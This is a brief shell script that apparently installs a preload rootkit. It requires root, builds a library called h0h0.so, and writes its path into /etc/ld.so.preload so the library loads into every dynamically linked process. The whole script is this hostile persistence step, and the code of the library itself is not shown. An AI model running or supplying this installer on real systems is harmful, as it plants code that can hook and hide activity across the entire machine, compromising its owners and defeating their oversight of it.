#!/bin/sh

OUTFILE="$PWD/h0h0.so"

if [ "$(id -u)" != "0" ]; then
    echo "You need to be root, ya dard.\n" 1>&2
    exit 1
fi

make

if [ -f $OUTFILE ]; then
    echo $OUTFILE > /etc/ld.so.preload
    echo "Done.\n";
else
    echo "** $OUTFILE not found; cannot write to /etc/ld.so.preload. **\n" 1>&2;
fi
